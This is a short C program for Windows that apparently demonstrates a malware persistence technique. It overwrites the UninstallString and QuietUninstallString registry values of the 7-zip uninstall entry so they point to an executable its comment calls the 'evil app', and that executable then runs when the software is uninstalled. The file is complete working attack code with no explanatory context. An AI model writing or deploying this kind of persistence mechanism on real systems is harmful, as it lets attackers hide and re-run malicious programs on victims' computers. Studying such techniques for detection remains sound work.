#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
    HKEY hkey = NULL;

    // target app
    const char* app = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\7-zip";

    // evil app
    const char* exe = "C:\\Users\\Public\\to_persist.exe";

    // app
    LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)app, 0 , KEY_WRITE, &hkey);
    if (res == ERROR_SUCCESS) {
    RegSetValueEx(hkey, (LPCSTR)"UninstallString", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
    RegSetValueEx(hkey, (LPCSTR)"QuietUninstallString", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
    RegCloseKey(hkey);
    }

    return 0;
}